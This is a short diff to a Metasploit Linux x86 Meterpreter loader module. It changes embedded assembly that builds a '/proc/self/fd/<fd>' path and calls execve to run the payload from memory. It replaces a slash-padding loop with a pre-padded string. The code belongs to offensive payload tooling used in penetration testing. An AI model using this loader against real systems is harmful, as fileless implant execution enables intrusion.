@@ -29,7 +29,7 @@ module Msf::Payload::Linux::X86::MeterpreterLoader
         mov eax, esi
       itoa:
         test eax, eax
-        jz fixpath
+        jz execve
         mov edx, 10
         div dl
         mov edx, eax
@@ -39,21 +39,14 @@ module Msf::Payload::Linux::X86::MeterpreterLoader
         mov byte [ebx + ecx], dl
         dec ecx
         jmp itoa
-      fixpath:
-        cmp ecx, 13
-        je execve
-        mov byte [ebx + ecx], '/'
-        dec ecx
-        jmp fixpath
       execve:
         xor ecx, ecx
         xor edx, edx
         mov eax, 0xb
         int 0x080                           ; execve("/proc/self/fd/<fd>", NULL, NULL);
-
       get_command:
         call got_command
-        db "/proc/self/fd/", 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+        db "/proc/self/fd//////", 0x00
       get_payload:
         call got_payload
     ^
